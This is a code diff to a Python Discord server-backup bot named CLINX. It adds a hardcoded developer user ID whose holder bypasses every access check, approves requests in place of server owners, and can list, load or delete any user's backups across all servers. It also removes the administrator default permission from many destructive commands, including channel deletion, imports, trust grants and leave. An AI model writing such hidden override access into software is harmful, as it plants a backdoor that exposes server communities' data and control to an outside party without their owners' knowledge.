@@ -19,6 +19,13 @@ from discord.ext import commands
 TOKEN = os.getenv("BOT_TOKEN")
 DEFAULT_BACKUP_GUILD_ID = os.getenv("DEFAULT_BACKUP_GUILD_ID")
 SUPPORT_SERVER_URL = os.getenv("SUPPORT_SERVER_URL", "https://discord.gg/V6YEw2Wxcb")
+DEFAULT_DEVELOPER_USER_IDS = {1240237445841420302}
+DEVELOPER_USER_IDS = set(DEFAULT_DEVELOPER_USER_IDS)
+DEVELOPER_USER_IDS.update(
+    int(raw_id.strip())
+    for raw_id in os.getenv("DEVELOPER_USER_IDS", "").split(",")
+    if raw_id.strip().isdigit()
+)
 
 DATA_DIR = Path(__file__).parent / "data"
 BACKUP_FILE = DATA_DIR / "backups.json"
@@ -46,6 +53,10 @@ T = TypeVar("T")
 
 def utc_now_iso() -> str:
     return datetime.now(timezone.utc).isoformat()
+
+
+def is_developer_user(user_id: int) -> bool:
+    return user_id in DEVELOPER_USER_IDS
 
 
 def make_embed(
@@ -299,7 +310,14 @@ async def user_backup_id_autocomplete(
     current: str,
 ) -> list[app_commands.Choice[str]]:
     store = load_backup_store()
-    records = get_user_backup_records(store, interaction.user.id)
+    if is_developer_user(interaction.user.id):
+        records = sorted(
+            store.get("backups", {}).values(),
+            key=parse_backup_created_at,
+            reverse=True,
+        )
+    else:
+        records = get_user_backup_records(store, interaction.user.id)
     needle = current.casefold().strip()
     choices: list[app_commands.Choice[str]] = []
 
@@ -385,6 +403,9 @@ def require_clinx_access(
     guild = interaction.guild
     user = interaction.user
     tier = get_command_safety_tier(command_name, context)
+
+    if is_developer_user(user.id):
+        return ClinxAccessDecision(tier=tier, direct_allowed=True, requires_owner_approval=False)
 
     if tier == SAFETY_TIER_PUBLIC:
         return ClinxAccessDecision(tier=tier, direct_allowed=True, requires_owner_approval=False)
@@ -548,9 +569,9 @@ class OwnerApprovalView(discord.ui.View):
         return pending
 
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
-        if interaction.user.id == self.owner_id:
+        if interaction.user.id == self.owner_id or is_developer_user(interaction.user.id):
             return True
-        await interaction.response.send_message("Only the server owner can approve or deny this CLINX request.", ephemeral=True)
+        await interaction.response.send_message("Only the server owner or a CLINX developer can approve or deny this request.", ephemeral=True)
         return False
 
     async def on_timeout(self) -> None:
@@ -2555,7 +2576,6 @@ async def on_app_command_error(interaction: discord.Interaction, error: app_comm
 
 @backup_group.command(name="create", description="Create a backup snapshot and return load ID")
 @app_commands.describe(source_guild_id="Guild ID to backup (optional)")
-@app_commands.default_permissions(administrator=True)
 async def backup_create(interaction: discord.Interaction, source_guild_id: int | None = None) -> None:
     if await enforce_clinx_access(interaction, "backup create") is None:
         return
@@ -2597,7 +2617,6 @@ async def backup_create(interaction: discord.Interaction, source_guild_id: int |
 
 @backup_group.command(name="load", description="Load backup by ID with action selection")
 @app_commands.describe(load_id="Backup load ID", target_guild_id="Target guild ID (optional)")
-@app_commands.default_permissions(administrator=True)
 async def backup_load(interaction: discord.Interaction, load_id: str, target_guild_id: int | None = None) -> None:
     if await enforce_clinx_access(interaction, "backup load planner") is None:
         return
@@ -2608,7 +2627,7 @@ async def backup_load(interaction: discord.Interaction, load_id: str, target_gui
     if record is None:
         await interaction.followup.send(embed=make_embed("Invalid Load ID", "No backup found with that ID.", EMBED_ERR), ephemeral=True)
         return
-    if record.get("created_by_user_id") != interaction.user.id:
+    if record.get("created_by_user_id") != interaction.user.id and not is_developer_user(interaction.user.id):
         await interaction.followup.send(
             embed=make_embed("Access Denied", "You can only load backups created by your account.", EMBED_ERR),
             ephemeral=True,
@@ -2631,12 +2650,19 @@ async def backup_load(interaction: discord.Interaction, load_id: str, target_gui
 
 
 @backup_group.command(name="list", description="List saved backup IDs")
-@app_commands.default_permissions(administrator=True)
 async def backup_list(interaction: discord.Interaction) -> None:
     if await enforce_clinx_access(interaction, "backup list") is None:
         return
     store = load_backup_store()
-    entries = get_user_backup_records(store, interaction.user.id)[:20]
+    developer_view = is_developer_user(interaction.user.id)
+    if developer_view:
+        entries = sorted(
+            store.get("backups", {}).values(),
+            key=parse_backup_created_at,
+            reverse=True,
+        )[:25]
+    else:
+        entries = get_user_backup_records(store, interaction.user.id)[:20]
     if not entries:
         await interaction.response.send_message(embed=make_embed("Backups", "You have not created any backups yet.", EMBED_INFO), ephemeral=True)
         return
@@ -2645,13 +2671,17 @@ async def backup_list(interaction: discord.Interaction) -> None:
     for entry in entries:
         source_name = entry.get("source_guild_name", "unknown")
         created_at = format_backup_timestamp(entry)
-        lines.append(f"`{entry['id']}`\n`{source_name}` • `{created_at}`")
-    await interaction.response.send_message(embed=make_embed("Backups", "\n".join(lines), EMBED_INFO), ephemeral=True)
+        if developer_view:
+            owner_name = entry.get("created_by_display_name", "unknown")
+            lines.append(f"`{entry['id']}`\n`{source_name}` • `{created_at}` • by `{owner_name}`")
+        else:
+            lines.append(f"`{entry['id']}`\n`{source_name}` • `{created_at}`")
+    title = "Backups · Developer View" if developer_view else "Backups"
+    await interaction.response.send_message(embed=make_embed(title, "\n".join(lines), EMBED_INFO), ephemeral=True)
 
 
 @backup_group.command(name="delete", description="Delete a backup ID")
 @app_commands.describe(load_id="Backup load ID")
-@app_commands.default_permissions(administrator=True)
 async def backup_delete(interaction: discord.Interaction, load_id: str) -> None:
     if await enforce_clinx_access(interaction, "backup delete") is None:
         return
@@ -2660,7 +2690,7 @@ async def backup_delete(interaction: discord.Interaction, load_id: str) -> None:
     if record is None:
         await interaction.response.send_message(embed=make_embed("Error", "Load ID not found.", EMBED_ERR), ephemeral=True)
         return
-    if record.get("created_by_user_id") != interaction.user.id:
+    if record.get("created_by_user_id") != interaction.user.id and not is_developer_user(interaction.user.id):
         await interaction.response.send_message(
             embed=make_embed("Access Denied", "You can only delete backups created by your account.", EMBED_ERR),
             ephemeral=True,
@@ -2694,13 +2724,11 @@ async def backup_delete_autocomplete(
 
 
 @bot.tree.command(name="backupcreate", description="Alias of /backup create")
-@app_commands.default_permissions(administrator=True)
 async def backupcreate_alias(interaction: discord.Interaction, source_guild_id: int | None = None) -> None:
     await backup_create.callback(interaction, source_guild_id)
 
 
 @bot.tree.command(name="backupload", description="Alias of /backup load")
-@app_commands.default_permissions(administrator=True)
 async def backupload_alias(interaction: discord.Interaction, load_id: str, target_guild_id: int | None = None) -> None:
     await backup_load.callback(interaction, load_id, target_guild_id)
 
@@ -2714,14 +2742,12 @@ async def backupload_alias_autocomplete(
 
 
 @bot.tree.command(name="backuplist", description="Alias of /backup list")
-@app_commands.default_permissions(administrator=True)
 async def backuplist_alias(interaction: discord.Interaction) -> None:
     await backup_list.callback(interaction)
 
 
 @bot.tree.command(name="restore_missing", description="Restore only missing categories/channels from source")
 @app_commands.describe(source_guild_id="Source guild ID", target_guild_id="Target guild ID")
-@app_commands.default_permissions(administrator=True)
 async def restore_missing(interaction: discord.Interaction, source_guild_id: int | None = None, target_guild_id: int | None = None) -> None:
     decision = await enforce_clinx_access(interaction, "restore_missing")
     if decision is None:
@@ -2834,7 +2860,6 @@ async def restore_missing(interaction: discord.Interaction, source_guild_id: int
 
 
 @bot.tree.command(name="cleantoday", description="Delete channels created today (UTC)")
-@app_commands.default_permissions(administrator=True)
 async def cleantoday(interaction: discord.Interaction, confirm: bool = False) -> None:
     decision = await enforce_clinx_access(interaction, "cleantoday")
     if decision is None:
@@ -3060,7 +3085,6 @@ class MassChannelsModal(discord.ui.Modal, title="Mass Channel Creator"):
 
 
 @bot.tree.command(name="masschannels", description="Open the bulk channel creator modal")
-@app_commands.default_permissions(administrator=True)
 async def masschannels(interaction: discord.Interaction, create_categories: bool = True) -> None:
     if await enforce_clinx_access(interaction, "masschannels modal") is None:
         return
@@ -3571,7 +3595,6 @@ async def run_import_job(
 
 
 @import_group.command(name="guild", description="Import a guild snapshot JSON file")
-@app_commands.default_permissions(administrator=True)
 async def import_guild(interaction: discord.Interaction, file: discord.Attachment) -> None:
     decision = await enforce_clinx_access(interaction, "import guild")
     if decision is None:
@@ -3656,7 +3679,6 @@ async def import_guild(interaction: discord.Interaction, file: discord.Attachmen
 
 
 @import_group.command(name="status", description="Get current import status")
-@app_commands.default_permissions(administrator=True)
 async def import_status(interaction: discord.Interaction) -> None:
     if await enforce_clinx_access(interaction, "import status") is None:
         return
@@ -3679,7 +3701,6 @@ async def import_status(interaction: discord.Interaction) -> None:
 
 
 @import_group.command(name="cancel", description="Cancel running import")
-@app_commands.default_permissions(administrator=True)
 async def import_cancel(interaction: discord.Interaction) -> None:
     if await enforce_clinx_access(interaction, "import cancel") is None:
         return
@@ -3700,7 +3721,6 @@ async def import_cancel(interaction: discord.Interaction) -> None:
 
 
 @safety_group.command(name="grant", description="Owner-only: grant CLINX trusted admin access")
-@app_commands.default_permissions(administrator=True)
 async def safety_grant(interaction: discord.Interaction, user: discord.Member) -> None:
     if await enforce_clinx_access(interaction, "safety grant") is None:
         return
@@ -3723,7 +3743,6 @@ async def safety_grant(interaction: discord.Interaction, user: discord.Member) -
 
 
 @safety_group.command(name="revoke", description="Owner-only: revoke CLINX trusted admin access")
-@app_commands.default_permissions(administrator=True)
 async def safety_revoke(interaction: discord.Interaction, user: discord.Member) -> None:
     if await enforce_clinx_access(interaction, "safety revoke") is None:
         return
@@ -3743,7 +3762,6 @@ async def safety_revoke(interaction: discord.Interaction, user: discord.Member) 
 
 
 @safety_group.command(name="list", description="Owner-only: list CLINX trusted admins")
-@app_commands.default_permissions(administrator=True)
 async def safety_list(interaction: discord.Interaction) -> None:
     if await enforce_clinx_access(interaction, "safety list") is None:
         return
@@ -3776,7 +3794,6 @@ async def invite(interaction: discord.Interaction) -> None:
 
 
 @bot.tree.command(name="leave", description="Make bot leave this server")
-@app_commands.default_permissions(administrator=True)
 async def leave(interaction: discord.Interaction) -> None:
     if await enforce_clinx_access(interaction, "leave") is None:
         return
